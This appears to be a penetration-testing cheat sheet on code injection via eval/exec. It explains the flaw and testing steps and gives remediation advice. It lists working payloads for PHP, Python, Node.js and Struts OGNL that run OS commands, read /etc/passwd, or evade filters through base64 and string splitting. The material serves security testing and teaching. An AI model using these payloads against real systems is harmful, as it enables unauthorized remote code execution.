# Code Injection (eval / exec)

## Overview
Code injection occurs when user-supplied data is passed to a code evaluation function (`eval()`, `exec()`, `assert()`, `preg_replace` with `/e`, `create_function()`) and executed as code in the server-side language. Unlike OS command injection which spawns shell processes, code injection executes directly within the application's runtime — giving the attacker full access to the language's capabilities, including file system access, network calls, and object instantiation.

## How It Works
- The application passes user input to a dynamic code evaluation function without sanitization.
- The injected code runs in the same interpreter context as the application with the same variable access.
- Common in PHP (`eval()`, `preg_replace('/pattern/e', input, str)`), Python (`eval()`, `exec()`), JavaScript (Node.js `eval()`), Ruby (`eval()`), Perl (`eval()`).
- SSTI (Server-Side Template Injection) is a specific form of code injection via template evaluation.

## Impact
- Remote Code Execution — executing arbitrary OS commands via language-level wrappers.
- Reading application source code, config files, environment variables.
- Writing files to disk (creating backdoors/webshells).
- Exfiltrating secrets (DB passwords, API keys) directly from the application's memory.

## Where to Look
- Math expression evaluators (calculators, formula fields).
- Dynamic query or filter construction: `?sort=price`, `?filter=field:value`.
- Template rendering with user content (see SSTI).
- Serialized data being `eval()`'d on load.
- Plugin/module systems that interpret user-provided code.
- `assert()` in PHP when used with user input (old PHP < 8 behavior).
- "Expression language" features in Java EE apps (Spring EL, OGNL in Struts).

## Testing Steps
1. Identify parameters that might feed into code evaluation (dynamic filters, calculators, expression fields).
2. Submit `7*7` — if `49` appears in the response, math evaluation is happening.
3. In PHP: try `phpinfo()`, `system('id')`, `passthru('id')`.
4. In Python: try `__import__('os').popen('id').read()`.
5. In Node.js: try `require('child_process').execSync('id').toString()`.
6. Look for OGNL injection in Struts2: `%{7*7}`, `${7*7}`.
7. Look for Spring EL: `${7*7}`, `#{7*7}`.
8. Try expression language in JNDI context (Log4Shell-like): `${java:version}`.

## Payloads / Techniques
```php
# PHP eval() injection
<?php system('id'); ?>
system('id')
passthru('id')
exec('id')
phpinfo()
shell_exec('cat /etc/passwd')

# PHP assert() injection (old PHP)
assert("system('id')")
assert("passthru('id')")
assert("eval(base64_decode('c3lzdGVtKCdpZCcp'))")
```

```python
# Python eval() injection
__import__('os').system('id')
__import__('os').popen('id').read()
__import__('subprocess').check_output('id', shell=True)

# Eval with string operations to bypass filters
getattr(__import__('os'), 'sys'+'tem')('id')
```

```javascript
// Node.js eval() injection
require('child_process').execSync('id').toString()
global.process.mainModule.require('child_process').execSync('id').toString()
```

```java
// OGNL injection (Apache Struts)
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"id"})).redirectErrorStream(true).start(),
  #b=#a.getInputStream(),
  #c=new java.io.InputStreamReader(#b),
  #d=new java.io.BufferedReader(#c),
  #e=#d.readLine(),
  #matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),
  #matt.getWriter().println(#e),
  #matt.getWriter().flush(),
  #matt.getWriter().close()}
```

## Burp Suite Tips
- In **Repeater**, test mathematical expressions first (`7*7`, `{{7*7}}`) to identify evaluation context.
- Use **Active Scanner** (Pro) to detect eval injection automatically.
- The **Java Deserialization Scanner** extension can help identify Java EL contexts.
- For OGNL (Struts): use the **Struts2 Scanner** BApp extension.

## Tools
- commix — for OS command execution via code injection
- ysoserial — for Java deserialization gadget chains
- Burp Suite Active Scanner
- Custom payloads per language context

## Remediation
- Never use `eval()`, `exec()`, `assert()`, or similar functions with user-controlled input.
- If dynamic code execution is a business requirement, use a safe sandbox (e.g., Pyodide, js-interpreter) with strict restrictions.
- Use parameterized, structured alternatives (e.g., a math parser library instead of `eval()`).
- Disable dangerous PHP functions in `php.ini`: `disable_functions = exec,passthru,shell_exec,system,eval`.
- Validate and whitelist user inputs strictly — reject anything that isn't expected.

## References
https://owasp.org/www-community/attacks/Code_Injection
https://portswigger.net/web-security/server-side-template-injection
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection
https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
